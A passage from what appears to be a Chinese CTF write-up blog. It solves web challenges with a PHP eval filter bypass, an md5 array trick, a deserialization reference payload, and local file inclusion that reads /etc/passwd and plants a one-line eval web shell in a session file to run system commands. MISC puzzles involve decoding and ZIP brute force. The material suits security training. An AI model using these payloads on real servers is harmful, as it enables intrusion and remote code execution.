14pt\">![](http://cdn.anyiblog.top/common/fa373982d3fbc1709fa92955c8b75a76.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">长度为49</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">我们可以用垃圾字符填充flag值 如[代码];1*n;这种方式</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">第三个判断:</span>\n\n<span style=\"font-size: 14pt\">过滤了一堆字符`'\"'\\.'\\\\'\\('\\)'\\['\\]'_'flag'echo'print'require'include'die'exit</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/f42e51bceea6517bc1f2967855874437.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">第四个判断:</span>\n\n<span style=\"font-size: 14pt\">判断传入flag的值等于flag值的哈希值，正确就输出flag。用的是严格的三个等号的比较，flag都不知道，哈希值更不可能知道(===强相等,类型和值都要相等)，</span>\n\n<span style=\"font-size: 14pt\">但存在eval($_GET[&apos;flag&apos;])可以任意代码执行</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/3cf90f892ebc89b4465f0b2e49507f83.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">尝试绕过过滤:</span>\n\n<span style=\"font-size: 14pt\">echo被过滤了，用php短标签进行输出;</span>\n\n<span style=\"font-size: 14pt\">flag被过滤了，用先赋其他值，再修改的方法绕过</span>\n\n    当php开启短标签后，\n    能正常解析类似于这样形式的php文件： phpinfo() ?>\n    并且可以使用<?=$a?>的形式输出\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">为了使payload长度与$exam长度相等，在代码间加入无意义的语句。</span>\n\n<span style=\"font-size: 14pt\">构造payload：/?flag=$a=blag;$a{0}=f;111111111111111111111;?><?=$$a;?></span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/7ed4d99960e02120499b1072f4126054.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">18.PHPGame</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/2aba5b3a726aa81327f05707de35cfe8.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">题目如下：</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/8fee2b08bcf35b6c81de5133b8f32d96.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">先看源码：</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/1396f95df7c9066da702739e5af6d317.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">先传参 然后开始。</span>\n\n<span style=\"font-size: 14pt\">题目源码如下：</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/fad4c69c6aed7b3e59f1856960292d3d.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n    <html>\n    <!--if($_REQUEST['mode']!=\"begin\"){\n        die(\"Welcome PHP Games!\");\n    }-->\n    </html>\n    <?php\n    error_reporting(0);\n    include 'fl4g.php';\n\n    if($_REQUEST['mode']!=\"begin\"){\n        die(\"PHP Games!\");\n    }else{\n        show_source(__FILE__);\n        class last_task{\n            var $left;\n            var $middle;\n            var $right;\n        }\n        $a=$_GET['a'];\n        $b=$_GET['b'];\n        if($a==$b){\n            die(\"wrong way\");\n        }else{\n            if(md5($a)!==md5($b)){\n                die(\"need a little magic\");\n            }else{\n                if($_POST['token']){\n                    $token = unserialize($_POST['token']);\n                    if($token['user']==\"user\"&&$token['pass']==\"pass\"){\n                            $flag=$_POST['flag'];\n                            if($flag){\n                                $flag = unserialize(urldecode($flag));\n                                $flag->middle = $fl4g;\n                                if($flag->middle===$flag->left&&$flag->middle===$flag->right){\n                                    echo \"this is your flag \".$flag->middle;\n                                }else{\n                                    die(\"one more step\");\n                                }\n                            }else{\n                                die(\"don't give up\");\n                            }\n                    }else{\n                        die(\"Not a valid token\");\n                    }\n                }else{\n                    die(\"give me the token\");\n                }\n            }\n        }\n    }\n    ?> wrong way\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">1、MD5弱比较绕过</span>\n\n![](http://cdn.anyiblog.top/common/b3462cbeb3fa51f8ae376ee7987b31ad.png)\n<span style=\"font-size: 14pt\">这里是要传入的变量a和变量b一样 并且md5值不能一样。</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">这里考察的点就是用数组绕过，php中因为数组的值不能被md5处理，则返回NULL，导致相等。</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">本地测试如下：</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/ba626fdacf9714a44d9e81d961c7fd09.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/4e9bafb09e19056d679a2a71769a92e5.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">因此第一层用/?mode=begin&a[]=1&b[]=2 绕过</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">2、数组反序列化</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\"></span>\n\n![](http://cdn.anyiblog.top/common/c4d81ab347cb3fc7accb01694b8dece9.png)\n<span style=\"font-size: 14pt\">这里要传一个数组，还得是反序列化，在本地构造一个就可以了。</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/5bd11104d378ffa6c4722709fe1fff66.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/2426d0e33dbde358ce4bb981a9c5c1f4.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">a:2:{s:4:\"user\";s:4:\"user\";s:4:\"pass\";s:4:\"pass\";}</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">成功绕过。</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/2aa56b6313711c5581795b4c25c1458c.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">3.PHP反序列化浅拷贝</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">重点来了，，这里是最难的部分。</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/ca885603e9fc8a1803dbd8a5a07c24af.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/ce301d2c6468e6ac2f80a1d6325a3cda.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">这里的意思是传一个反序列化后的值。然后要使last_task类中的left和right一定要等于$middle的值（这里middle的值是fl4g.php中的$fl4g变量） 也就是说能绕过就可以得到flag了。</span>\n\n<span style=\"font-size: 14pt\">因为绕过if判断后输出的值也是middle的值，而middle的值就是flag，所以我们不能改变middle的值。但是又得让left和right的值为middle的值，显然我们不知道flag是做不到的，因此这里考察的一个知识点就是PHP浅拷贝。</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">参考文章https://blog.csdn.net/crisprx/article/details/104457047 师傅讲的很细，这里概述一下。</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">先说一下深拷贝和浅拷贝通俗理解</span>\n\n<span style=\"font-size: 14pt\">深拷贝：赋值时值完全复制，完全的copy，对其中一个作出改变，不会影响另一个</span>\n\n<span style=\"font-size: 14pt\">浅拷贝：赋值时，引用赋值，相当于取了一个别名。对其中一个修改，会影响另一个</span>\n\n<span style=\"font-size: 14pt\">举个例子：(这里只做浅拷贝的例子)</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/0c83a8f56ca805801f23653e96bdab92.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">(网站回显)</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/2a47bbcf9c7a89f641c03d1d6038d6bd.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">而这道题要用到&apos;&&apos; 来浅拷贝</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">再来个李子：</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/4ed3336459c307e624bf230908fa728c.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/e6986455d3c2be48815a366e774bd0af.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">这里的知识点是引用传递。在这个例子中，将$a为crispr copy，$a前添加& 而$b又等于$a，然后又改变了$b的值，导致$a的值改变了。</span>\n\n<span style=\"font-size: 14pt\">参考:https://www.php.net/manual/zh/language.references.pass.php</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">所以我们的payload为：</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/b38f5749e768f97b3fea06746886bb58.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">或者：</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/7f0e4d3977a3f48bf333861022449858.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">这里将left和right的值取&$middle的值 然后再将值序列化传入即可。</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/9d06e973f57930d669a9ddd03f8a14b7.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">O:9:\"last_task\":3:{s:4:\"left\";N;s:6:\"middle\";R:2;s:5:\"right\";R:2;}</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">传入flag post值 得到flag</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/e136bf3a0a97b1cff9006bc0a9722465.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">19.应可鲁德</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/bbd7fe550c742d8ded57e4dc216fed9f.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">题目如下：</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/be98bab94c5039e4ae733800da5222c5.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">先是一个登陆页面，然后随便输入个id进去。如下：</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/04273a29d6835d31fffccb4ac888c97f.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">点击超链接，发现url明显的是文件包含。</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/ce24fe4f022d7c2428f14b2a51778230.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">尝试读取默认文件 /etc/passwd</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/3c9be52c87b7683c8cff4adacd2053b2.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">成功读取到了。说明这是一个通过get传参的include函数。</span>\n\n<span style=\"font-size: 14pt\">尝试读取flag一把梭。</span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/e07e8e204f085a25617f0267f44b103d.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">无果</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">先慢慢来，看源码先。</span>\n\n<span style=\"font-size: 14pt\">这里用php://filter伪协议读取文件</span>\n\n<span style=\"font-size: 14pt\">构造payload：php://filter/read=convert.base64-encode/resource=index.php</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">index源码如下：</span>\n\n    <!DOCTYPE html>\n    <html>\n    <head>\n    </head>\n    <body>\n        <form action=\"action.php\" method=\"POST\">\n        please input your name:\n\n        <input type=\"text\" name=\"name\" >\n\n        <input type=\"submit\" value=\"Submit\">\n    </form>\n    </body>\n    </html>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">再看下action.php的文件内容</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/cdb3f154b94e9c97592cf138c9ebb3d9.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">action源码如下：</span>\n\n    <?php\n    session_start();\n    error_reporting(0);\n    $name = $_POST['name'];\n    if($name){\n        $_SESSION[\"username\"] = $name;\n    }\n    include($_GET['file']);\n    ?>\n    <!DOCTYPE html>\n    <html>\n    <div>\n        <a href=\"action.php?file=1.txt\">ctf推荐书籍</a>\n        <a href=\"action.php?file=2.txt\">ctf刷题平台</a>\n    </div>\n    </html>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">这里很明显就是session包含。</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">在action.php中代码的这一块：</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n    $name = $_POST['name'];\n    if($name){\n        $_SESSION[\"username\"] = $name;\n    }\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">其原理是：</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/823fe51af4c3e333d4bd41239b754c08.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">在我们在首页(index.php)通过post传参传入了id后会发送到action.php 在action.php中会把用户名保存为传入的post值</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">而这个post值是可控的。因此我们只要传入<?php eval($_GET[&apos;s&apos;]);?> 一句话进去，再通过session</span>\n\n<span style=\"font-size: 14pt\">会创造一个临时文件，我们访问临时文件就可以实现任意代码执行了。接下来就懂得都懂。</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">php的 session文件的默认存放位置大致如下</span>\n\n    /var/lib/php/sess_PHPSESSID\n    /var/lib/php5/sess_PHPSESSID\n    /tmp/sess_PHPSESSID\n    /tmp/sessions/sess_PHPSESSID\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">先id传个<?php phpinfo(); ?></span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/b42040ca2cfed34604096da6042fa328.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">访问：</span><span style=\"font-size: 14pt\">/action.php?file=[php://filter/read=convert.base64-encode/resource=/tmp/sess_1c87b143947ceb5dac0b2adf082d0aab](//filter/read=convert.base64-encode/resource=/tmp/sess_1c87b143947ceb5dac0b2adf082d0aab)</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/cfdad4c9ed43dc27674d726acbd9772e.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/8d602c1b07bcdb98eea0451907ce3100.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">然后我们直接访问&nbsp;</span><span style=\"font-size: 14pt\">/action.php?file=/tmp/sess_1c87b143947ceb5dac0b2adf082d0aab</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/78b012d98b3ab47efad3a787b723aa27.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">到这里就简单了，然后我们再写个一句话木马进去</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/2eddc0832d8d5e94afdd99698327f87c.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">传入</span><span style=\"font-size: 14pt\">?file=/tmp/sess_c2ae0bc438de4b10b87b791a7514a375&c=system(&apos;ls /&apos;);</span>\n\n<span style=\"font-size: 14pt\">（注意这里多个传参要用&拼接）</span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/99a1643b1a8a445395a6128c9ce0c348.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">最后cat /fl444444444g就可以了</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/5bb59e8ad9d88a7266779d713559a88a.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">MISC></span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">1.无法达到的深度</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/333aaf80dc83d8ece28ee954d7828f4b.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">题目附件：</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/06ca13e8755bed335c77d47ae3186dce.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">结合题目和简介 (深度) 猜测通过改图片高度来拿flag</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">图片属性：</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/2aa44a6cecf16c82d9240cc713cbb831.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">winhex打开图片分析</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/d848cd6baa4dd368f915831efceb3a5c.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">高度628的hex值为0274 通过winhex搜索</span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/d1e8e4236dc90201c3bfcf40ebecb4e3.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/e29d33906402ca8e27757aeb30283628.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/d59ccd6407ad488606b8c31e6dce0efb.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">这里左边的是高度 右边的是宽度</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">把0274改高 比如改为0500 保存：</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/b75d5e078fde949d570bc2833de50623.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">图片有文字提示 再改高点 直接改为 2F00(约10000)</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/1cd1731771947fc59d1ff155f4d444f5.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">得到flag</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">2.五步飞扬</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/86c8664ea57d8fd4ab63371338db8855.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">题目附件：</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/d9b10f84010648dd05f531b18c657b8b.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">第一步：</span>\n\n<span style=\"font-size: 14pt\">ASCII:</span>\n\n<span style=\"font-size: 14pt\">102 108 97 103 123</span>\n\n<span style=\"font-size: 14pt\">用python解</span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/c9d37c638d53f1857cd94c6828282288.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">解得 flag{</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">第二步：</span>\n\n<span style=\"font-size: 14pt\">URL:</span>\n\n<span style=\"font-size: 14pt\">%5Cu0063%5Cu0034%5Cu0038%5Cu0032%5Cu0035%5Cu0031%5Cu0035%5Cu0030</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/f7d1740081c0d1b778e718f49cc2aebd.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">url解码得到&nbsp;</span><span style=\"font-size: 14pt\">c4825150</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/d07eb0d80c1bb3c58b7d7a635c0bceb5.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">得到c4825150</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">第三步：</span>\n\n<span style=\"font-size: 14pt\">摩斯电码</span>\n\n<span style=\"font-size: 14pt\">-....- . ----. ..-. ----. ----- ----- -.-. -----</span>\n\n<span style=\"font-size: 14pt\">在线网站解一下即可。</span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/2f7e8a308c9640df5525a8fea3a5ab96.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">得到</span><span style=\"font-size: 14pt\">-e9f900c0</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">第四步：</span>\n\n<span style=\"font-size: 14pt\">BrainFuck解码</span>\n\n<span style=\"font-size: 14pt\">+++++ +[->+ +++++ <]>++ +++++ ++.<+ +++++ +[->+ +++++ +<]>+ +++++ .--.+</span>\n\n<span style=\"font-size: 14pt\">+..<+ +++++ [->-- ----< ]>--- ----- .---- ----. <++++ +++[- >++++ +++<]</span>\n\n<span style=\"font-size: 14pt\">>++++ +.<++ +++++ [->-- ----- <]>-- --.++ .<</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/9fdc52faa9607ef208f52c43660a4ea8.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\"></span>\n\n![](http://cdn.anyiblog.top/common/46d8759713b4a304d567ff8681dace3a.png)\n<span style=\"font-size: 14pt\">得到</span><span style=\"font-size: 14pt\">-dbdd80f13</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">第五步：</span>\n\n<span style=\"font-size: 14pt\">base系列(base64->base32->base16)</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">R1UyRE1PQldIRTNUR01SUUdZNFRPTVpTR0EzVFNOU0dHNDJUT01SU0dBM0RNTlNER1lZVE1OWlRJRVpFSU5SV0dZMkRHTUJUR0VaVE9NWlRHWVpET1JBPQ==</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">直接用ciphey一把梭：</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/f26a7bdf3a2d4aa88b3d4a87ebaf30d6.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">得到：</span><span style=\"font-size: 14pt\">-fd0173b}</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">组合flag 得到flag{</span><span style=\"font-size: 14pt\">c4825150</span><span style=\"font-size: 14pt\">-e9f900c0</span><span style=\"font-size: 14pt\">-dbdd80f13</span><span style=\"font-size: 14pt\">-fd0173b}</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">3</span><span style=\"font-size: 14pt;color: unset;font-family: unset\">.爆破鬼才</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/f0723d97d0520b95ec91776011fc7d80.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">题目附件：</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/9be5b844092095205f5d79b34b864d03.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">题目说是密码爆破 且为四位数字 用ARCHPR爆破</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/8dfae29a46b59a2127bcc0b878137229.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/03229b74fd133cc5735eb803478f88fa.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">将压缩包拖入即可。</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/c309220a1b7f24afe110c2f8d81b216a.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">得到密码为8964 用密码打开文本即可得到flag</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">flag{657ef479be76fe227ce09f9dd22c2cd8}</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/2a71e46b8737811ec782be36068d6d08.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">4.九层妖塔</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/52e6dfa0a4614b62d92f24d945426f99.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">（此题搬运自DASCTF魔法世界 《闯入魔塔的魔法少女》）</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">题目附件：</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/ba36ceffed494cdd15cfb3228b9fb1a7.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">预期解是用swf逆向即可 当然玩五十层魔塔也可以。。</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">用Flash Decomplier反编译工具打开</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 